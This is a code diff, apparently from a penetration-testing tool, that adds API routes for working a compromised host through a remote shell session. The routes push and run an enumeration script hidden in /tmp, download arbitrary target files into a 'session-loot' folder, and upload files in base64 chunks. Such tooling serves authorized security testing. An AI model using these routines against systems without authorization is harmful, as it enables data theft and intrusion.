@@ -128,6 +128,119 @@ def register_sessions_routes(app: FastAPI, ctx) -> None:
         broker.publish({"type": "session", "event": "upgrading", "id": sess.id})
         return {"ok": True, "callback": f"{lhost}:{port}"}
 
+    async def _push_file(sess, remote_path: str, data: bytes) -> None:
+        """Write bytes to a file on the target through the shell, chunked so no single line
+        exceeds the PTY canonical-mode limit (~4 KB) — base64 in small appends, then decode."""
+        import shlex
+        q = shlex.quote(remote_path).encode()
+        b64 = base64.b64encode(data)
+        await sess.send(b": > " + q + b".b64\n")            # truncate staging file
+        for i in range(0, len(b64), 2048):
+            await sess.send(b"printf '%s' '" + b64[i:i + 2048] + b"' >> " + q + b".b64\n")
+        await sess.send(b"base64 -d " + q + b".b64 > " + q + b" && rm -f " + q + b".b64\n")
+
+    @app.post("/api/sessions/{session_id}/enum")
+    async def run_enum(session_id: str, x_tester: str = Header(default="someone")):
+        """Run recce's on-target enumeration THROUGH the shell and fold the output straight
+        into the engagement — the deepest tie-in: a foothold becomes findings/privesc on its
+        host, no copy-paste. Pushes recce-enum.sh, runs it, captures output, then `ingest`s it."""
+        import os
+        import tempfile
+        sess = mgr.get(session_id)
+        if sess is None:
+            raise HTTPException(404, "no such session")
+        if not sess.connected:
+            raise HTTPException(409, "shell not connected")
+        enum_sh = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))),
+                               "local", "recce-enum.sh")
+        if not os.path.isfile(enum_sh):
+            raise HTTPException(500, "recce-enum.sh not found")
+        # push the enum script (chunked — avoids the PTY line limit), then run + capture.
+        # bash (the script needs bashisms) piped through cat (so it doesn't colorize a tty).
+        await _push_file(sess, "/tmp/.re.sh", open(enum_sh, "rb").read())
+        out = await sess.run_and_capture(
+            b"bash /tmp/.re.sh 2>/dev/null | cat; rm -f /tmp/.re.sh", timeout=240.0)
+        if not out.strip():
+            raise HTTPException(422, "enum produced no output (is /bin/sh / base64 present?)")
+        # write the loot and fold it in via the same `ingest` pipeline imports use
+        from ..jobs import recce_argv
+        fd, tmp = tempfile.mkstemp(prefix="recce-sessenum-", suffix=".txt")
+
+        def _done(job, _tmp=tmp):
+            try:
+                os.remove(_tmp)
+            except OSError:
+                pass
+            broker.publish({"type": "scan", "status": job.status, "tester": x_tester,
+                            "targets": f"ingest shell-enum {sess.host_ip}"})
+
+        try:
+            with os.fdopen(fd, "wb") as fh:
+                fh.write(out)
+            job = ctx.jobs.start(
+                recce_argv("ingest", tmp, "-o", ctx.eng_dir, "--host", sess.host_ip),
+                on_done=_done)
+        except BaseException:
+            try:
+                os.remove(tmp)
+            except OSError:
+                pass
+            raise
+        broker.publish({"type": "session", "event": "enum", "id": sess.id})
+        return {"ok": True, "mode": "job", "id": job.id, "bytes": len(out)}
+
+    @app.post("/api/sessions/{session_id}/download")
+    async def download(session_id: str, body: dict = Body(...)):
+        """Pull a file off the target through the shell (base64 over the channel) and save it
+        into the engagement's session-loot dir."""
+        import os
+        import shlex
+        sess = mgr.get(session_id)
+        if sess is None:
+            raise HTTPException(404, "no such session")
+        path = str(body.get("path", "")).strip()
+        if not path:
+            raise HTTPException(400, "path required")
+        if not sess.connected:
+            raise HTTPException(409, "shell not connected")
+        out = await sess.run_and_capture(b"base64 " + shlex.quote(path).encode() + b" 2>/dev/null")
+        cleaned = bytes(c for c in out if c not in b"\r\n \t")
+        if not cleaned:
+            raise HTTPException(422, "no data — file missing, unreadable, or base64 unavailable")
+        try:
+            raw = base64.b64decode(cleaned, validate=True)
+        except Exception:
+            raise HTTPException(422, "could not decode the transferred data")
+        ddir = os.path.join(ctx.eng_dir, "session-loot")
+        os.makedirs(ddir, exist_ok=True)
+        dest = os.path.join(ddir, f"{sess.host_ip}_{os.path.basename(path) or 'download'}")
+        with open(dest, "wb") as f:
+            f.write(raw)
+        broker.publish({"type": "session", "event": "download", "id": sess.id})
+        return {"ok": True, "saved": dest, "size": len(raw)}
+
+    @app.post("/api/sessions/{session_id}/upload")
+    async def upload(session_id: str, body: dict = Body(...)):
+        """Push a file to the target through the shell (chunked base64 → base64 -d)."""
+        sess = mgr.get(session_id)
+        if sess is None:
+            raise HTTPException(404, "no such session")
+        path = str(body.get("path", "")).strip()
+        data_b64 = str(body.get("data", ""))
+        if not path or not data_b64:
+            raise HTTPException(400, "path and data (base64) required")
+        try:
+            raw = base64.b64decode(data_b64, validate=True)
+        except Exception:
+            raise HTTPException(400, "data must be base64")
+        if len(raw) > 5_000_000:
+            raise HTTPException(413, "file too large (max ~5 MB)")
+        if not sess.connected:
+            raise HTTPException(409, "shell not connected")
+        await _push_file(sess, path, raw)           # chunked — safe past the PTY line limit
+        broker.publish({"type": "session", "event": "upload", "id": sess.id})
+        return {"ok": True, "bytes": len(raw)}
+
     @app.post("/api/sessions/{session_id}/cred")
     def loot_cred(session_id: str, body: dict = Body(...),
                   x_tester: str = Header(default="someone")):
